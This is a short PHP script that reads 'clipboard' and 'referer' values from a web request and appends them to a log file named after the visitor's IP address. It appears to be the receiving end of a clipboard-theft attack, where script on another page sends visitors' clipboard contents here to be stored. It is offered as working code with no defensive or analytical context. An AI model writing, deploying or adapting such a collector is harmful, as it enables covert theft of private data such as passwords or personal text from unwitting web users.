<?php
if(isset($_GET['clipboard']) && isset($_GET['referer'])) {
    $clipboard=$_GET['clipboard'];
    $referer=$_GET['referer'];
    $logfile="./logs/".$_SERVER['REMOTE_ADDR']." - clipboard.txt";
    $fp = fopen($logfile, "a") or die("Unable to open file!");
    fwrite($fp, $clipboard."\r\n^--- FROM ".$referer."\r\n") or die("Unable to write to file!");
    fflush($fp);
    fclose($fp);
}
?>
